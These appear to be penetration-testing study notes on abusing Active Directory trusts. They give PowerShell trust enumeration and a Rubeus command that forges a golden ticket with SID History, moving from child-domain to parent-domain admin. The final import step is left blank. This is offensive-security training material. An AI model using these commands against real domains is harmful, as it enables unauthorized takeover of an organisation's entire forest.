# Forest and Domain Trusts Notes

child domains are added to forests with a transitive, two-way trusts with its parent

list trust
```
powershell Get_DomainTrust
```

things to look at:
- Sourcename - current domain
- Targetname - foreign domain
- TrustDirection - trust direction applied
- TrustAttributes - can tell us if both domains are in a forest. WITHIN_FOREST can indicate a child/parent relationship

DA privs in the child means DA privs in the parent using a TGT with the SID History attribute

**Golden Ticket with SID History**

need target groups SID
```
powershell Get-DomainGroup -Identity "Domain Admins" -Domain <parent domain> -Properties ObjectSid
```

create golden ticket
```
C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:<krbtgt hash> /user:Administrator /domain:<child domain> /sid:<child domains sid> /sids:<target groups SID> /nowrap
```

import
```

```
